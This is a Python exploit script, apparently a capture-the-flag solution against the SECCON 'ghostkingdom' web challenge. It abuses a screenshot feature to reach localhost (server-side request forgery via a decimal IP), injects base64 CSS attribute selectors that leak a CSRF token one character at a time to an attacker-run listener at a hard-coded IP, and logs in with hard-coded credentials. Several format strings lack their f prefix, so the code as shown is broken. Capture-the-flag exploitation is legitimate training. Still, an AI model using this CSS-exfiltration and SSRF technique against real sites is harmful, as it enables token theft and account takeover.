import base64
import http.server
import re
import string
import sys
import time
import urllib.parse
import requests


SERVER_IP = '35.240.159.190:3030'
USER = 'thuan2'
PASS = '123qweasd'


class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(http.server.HTTPStatus.OK)
        self.end_headers()
        self.wfile.write('Hi'.encode())
        c = re.search(r'csrf=(.*)$', self.path)
        if c is not None:
            csrf = c.group(1)
            print({csrf})
            if len(csrf) == 22:
                sys.exit(0)
            css = gen_css_param(csrf)
            take_snap('http://2130706433/?css={css}&msg=a&action=msgadm2')


def gen_css_param(known=''):
    csss = []
    for s in string.ascii_lowercase + string.digits:
        csss.append('input[name="csrf"][value^="{known}{s}"]{{background:url("//{SERVER_IP}/?csrf={known}{s}");}}')
    b64css = base64.b64encode(''.join(csss).encode())
    return urllib.parse.quote(b64css)


def take_snap(url):
    print('[+] take_snap')
    url = urllib.parse.quote(url)
    while True:
        resp = requests.get('http://ghostkingdom.pwn.seccon.jp/?url={url}&action=sshot2',headers={'Cookie': _SESS})
        if 'Please wait' not in resp.text:
            print('[+] done')
            return
        print('[+] waiting')
        time.sleep(5)


_SESS = ''
def main():
    global _SESS
    resp = requests.get('http://ghostkingdom.pwn.seccon.jp/?action=login&user={USER}&pass={PASS}')
    _SESS = resp.headers['Set-Cookie'].split(';')[0]
    httpd = http.server.HTTPServer(('', 80), RequestHandler)
    take_snap('http://2130706433/?action=login&user={USER}&pass={PASS}')
    css = gen_css_param()
    take_snap('http://2130706433/?css={css}&msg=a&action=msgadm2')
    httpd.serve_forever()


if __name__ == '__main__':
    main()
